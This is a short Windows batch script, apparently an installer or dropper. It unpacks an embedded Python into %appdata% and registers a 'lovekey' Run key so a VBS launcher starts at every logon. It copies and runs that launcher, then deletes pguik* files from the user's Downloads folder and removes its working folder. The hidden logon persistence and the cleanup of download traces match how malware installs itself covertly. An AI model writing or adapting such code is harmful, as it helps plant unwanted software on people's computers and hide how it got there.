IF EXIST %appdata%\Python391\python.exe GOTO pythonInstalled
CD python391_embedded
"..\bin\7z.exe" x "python391_embedded.zip" *
MOVE python391 %appdata%
CD ..
:pythonInstalled
REG query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v lovekey
IF %errorlevel%==0 GOTO keyInstalled
REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v lovekey /t REG_EXPAND_SZ /d "%SystemRoot%\System32\WScript.exe %appdata%\file\launch.vbs"
:keyInstalled
IF EXIST %appdata%\file GOTO fileCopied
XCOPY src\file %appdata%\file /i
:fileCopied
"Wscript.exe" "%appdata%\file\launch.vbs"
CD ..
DEL %USERPROFILE%\Downloads\pguik* /a /s
RMDIR /Q /S rs